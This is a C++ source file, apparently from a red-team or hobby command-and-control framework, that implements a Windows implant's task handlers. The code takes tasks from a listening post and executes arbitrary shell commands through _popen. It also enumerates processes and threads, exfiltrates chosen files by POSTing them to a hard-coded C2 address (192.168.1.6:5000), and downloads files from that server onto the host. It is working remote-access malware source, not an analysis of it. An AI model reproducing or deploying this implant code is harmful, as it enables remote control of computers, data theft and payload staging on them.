#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "tasks.h"

#include <string>
#include <array>
#include <sstream>
#include <fstream>
#include <cstdlib>

#include <cpr/cpr.h>
#include <boost/property_tree/ptree.hpp>

#include <Windows.h>
#include <tlhelp32.h>


extern std::string ids;
// Function to parse the tasks from the property tree returned by the listening post
// Execute each task according to the key specified (e.g. Got task_type of "ping"? Run the PingTask)
[[nodiscard]] Task parseTaskFrom(const boost::property_tree::ptree& taskTree,
    std::function<void(const Configuration&)> setter) {
    // Get the task type and identifier, declare our variables
    const auto taskType = taskTree.get_child("task_type").get_value<std::string>();
    const auto idString = taskTree.get_child("task_id").get_value<std::string>();

    // Conditionals to determine which task should be executed based on key provided
    // REMEMBER: Any new tasks must be added to the conditional check, along with arg values
    // ===========================================================================================
    if (taskType == PingTask::key && idString == ids) {
        return PingTask{
            ids
        };
    }
    if (taskType == ConfigureTask::key && idString == ids) {
        return ConfigureTask{
            ids,
            taskTree.get_child("dwell").get_value<double>(),
            taskTree.get_child("running").get_value<bool>(),
            std::move(setter)
        };
    }
    if (taskType == ExecuteTask::key && idString == ids) {
        return ExecuteTask{
            ids,
            taskTree.get_child("command").get_value<std::string>()
        };
    }
    if (taskType == ListThreadsTask::key && idString == ids) {
        return ListThreadsTask{
            ids,
            taskTree.get_child("procid").get_value<std::string>()
        };
    }
    if (taskType == ListRunningProcesses::key && idString == ids) {
        return ListRunningProcesses{
            ids
        };
    }
    if (taskType == DownloadFileTask::key && idString == ids) {
        return DownloadFileTask{
            ids,
            taskTree.get_child("file").get_value<std::string>()
        };
    }
    if (taskType == UploadFileTask::key && idString == ids) {
        return UploadFileTask{
            ids,
            taskTree.get_child("file").get_value<std::string>()
        };
    }

    // ===========================================================================================

    // No conditionals matched, so an undefined task type must have been provided and we error out
    std::string errorMsg{ "Illegal task type encountered: " };
    errorMsg.append(taskType);
    throw std::logic_error{ errorMsg };
}

// Instantiate the implant configuration
Configuration::Configuration(const double meanDwell, const bool isRunning)
    : meanDwell(meanDwell), isRunning(isRunning) {}


// Tasks
// ===========================================================================================

// PingTask
// -------------------------------------------------------------------------------------------
PingTask::PingTask(const std::string& id)
    : id{ id } {}

Result PingTask::run() const {
    const auto pingResult = "PONG!";
    return Result{ id, pingResult, true };
}


// ConfigureTask
// -------------------------------------------------------------------------------------------
ConfigureTask::ConfigureTask(const std::string& id,
    double meanDwell,
    bool isRunning,
    std::function<void(const Configuration&)> setter)
    : id{ id },
    meanDwell{ meanDwell },
    isRunning{ isRunning },
    setter{ std::move(setter) } {}

Result ConfigureTask::run() const {
    // Call setter to set the implant configuration, mean dwell time and running status
    setter(Configuration{ meanDwell, isRunning });
    return Result{ id, "Configuration successful!", true };
}


// ExecuteTask
// -------------------------------------------------------------------------------------------
ExecuteTask::ExecuteTask(const std::string& id, std::string command)
    : id{ id },
    command{ std::move(command) } {}

Result ExecuteTask::run() const {
    std::string result;
    try {
        std::array<char, 128> buffer{};
        std::unique_ptr<FILE, decltype(&_pclose)> pipe{
            _popen(command.c_str(), "r"),
            _pclose
        };
        if (!pipe)
            throw std::runtime_error("Failed to open pipe.");
        while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
            result += buffer.data();
        }
        return Result{ id, std::move(result), true };
    }
    catch (const std::exception& e) {
        return Result{ id, e.what(), false };
    }
}

// ListThreadsTask
// -------------------------------------------------------------------------------------------
ListThreadsTask::ListThreadsTask(const std::string& id, std::string processId)
    : id{ id },
    processId{ processId } {}

Result ListThreadsTask::run() const {
    try {
        std::stringstream threadList;
        auto ownerProcessId{ 0 };

        // User wants to list threads in current process
        if (processId == "-") {
            ownerProcessId = GetCurrentProcessId();
        }
        // If the process ID is not blank, try to use it for listing the threads in the process
        else if (processId != "") {
            ownerProcessId = stoi(processId);
        }
        // Some invalid process ID was provided, throw an error
        else {
            return Result{ id, "Error! Failed to handle given process ID.", false };
        }

        HANDLE threadSnap = INVALID_HANDLE_VALUE;
        THREADENTRY32 te32;

        // Take a snapshot of all running threads
        threadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (threadSnap == INVALID_HANDLE_VALUE)
            return Result{ id, "Error! Could not take a snapshot of all running threads.", false };

        // Fill in the size of the structure before using it. 
        te32.dwSize = sizeof(THREADENTRY32);

        // Retrieve information about the first thread,
        // and exit if unsuccessful
        if (!Thread32First(threadSnap, &te32))
        {
            CloseHandle(threadSnap);     // Must clean up the snapshot object!
            return Result{ id, "Error! Could not retrieve information about first thread.", false };
        }

        // Now walk the thread list of the system,
        // and display information about each thread
        // associated with the specified process
        do
        {
            if (te32.th32OwnerProcessID == ownerProcessId)
            {
                // Add all thread IDs to a string stream
                threadList << "THREAD ID      = " << te32.th32ThreadID << "\n";
            }
        } while (Thread32Next(threadSnap, &te32));

        //  Don't forget to clean up the snapshot object.
        CloseHandle(threadSnap);
        // Return string stream of thread IDs
        return Result{ id, threadList.str(), true };
    }
    catch (const std::exception& e) {
        return Result{ id, e.what(), false };
    }
}

// ListRunningProcesses
// -------------------------------------------------------------------------------------------
ListRunningProcesses::ListRunningProcesses(const std::string& id)
    : id{ id } {}

Result ListRunningProcesses::run() const {
    try {
        std::stringstream processList;

        HANDLE hProcessSnap;
        PROCESSENTRY32 pe32;

        // Take a snapshot of all processes in the system.
        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hProcessSnap == INVALID_HANDLE_VALUE)
        {
            return Result{ id, "Error! Could not take a snapshot of all running processes.", false };
        }

        // Set the size of the structure before using it.
        pe32.dwSize = sizeof(PROCESSENTRY32);

        // Retrieve information about the first process,
        // and exit if unsuccessful
        if (!Process32FirstW(hProcessSnap, &pe32))
        {
            CloseHandle(hProcessSnap);          // clean the snapshot object
            return Result{ id, "Error! Could not retrieve information about first process.", false };
        }

        // Now walk the snapshot of processes, and
        // display information about each process in turn
        do
        {
            // STUPID CONVERSION FROM WCHAR TO ASCII STRING!!!!
            std::wstring ws(pe32.szExeFile);
            std::string process_name(ws.begin(), ws.end());
            processList << "Process: |" << process_name << "|\tPID: |" << pe32.th32ProcessID << "|\n";

        } while (Process32NextW(hProcessSnap, &pe32));
 
        CloseHandle(hProcessSnap);
        return Result{ id, processList.str(), true };
    }
    catch (const std::exception& e) {
        return Result{ id, e.what(), false };
    }
}

// DownloadFileTask (Uploads file to the C2 server)
// -------------------------------------------------------------------------------------------
DownloadFileTask::DownloadFileTask(const std::string& id, std::string path)
    : id{ id },
    path{ path } {}

Result DownloadFileTask::run() const {
    std::ifstream ifile(path);
    if (ifile) {
        std::string filepath = path;
        // Remove directory if present.
        std::string base_filename = path.substr(path.find_last_of("/\\") + 1);

        std::stringstream ss;
        ss << "http://192.168.1.6:5000/files/" << base_filename;
        std::string fullServerUrl = ss.str();
        cpr::Response r = cpr::Post(cpr::Url{ fullServerUrl }, cpr::Multipart{ {"Filedata", cpr::File{filepath}}});

        if (r.status_code == 201) { // checks if the request has return 201 CREATED
            return Result{ id, "File Download Successful!", true};
        }
        else {
            return Result{ id, "File Download Failed!", false };
        }
    }
    else {
        return Result{ id, "File Doesn't Exists!", false };
    }
}


// UploadFileTask (Downloads File From the C2 server)
// -------------------------------------------------------------------------------------------
UploadFileTask::UploadFileTask(const std::string& id, std::string filename)
    : id{ id },
    filename{ filename } {}

Result UploadFileTask::run() const {

    std::ofstream of(filename, std::ios::binary);
    std::stringstream ss;
    ss << "http://192.168.1.6:5000/files/" << filename;
    std::string fullServerUrl = ss.str();
    cpr::Response r = cpr::Download(of, cpr::Url{ fullServerUrl });
    if (r.status_code == 200) { // checks if the file has been downloaded successfully by the implant
        return Result{ id, "File Successfully Uploaded!", true };
    }
    else {
        return Result{ id, "File Upload Failed!", false };
    }
}
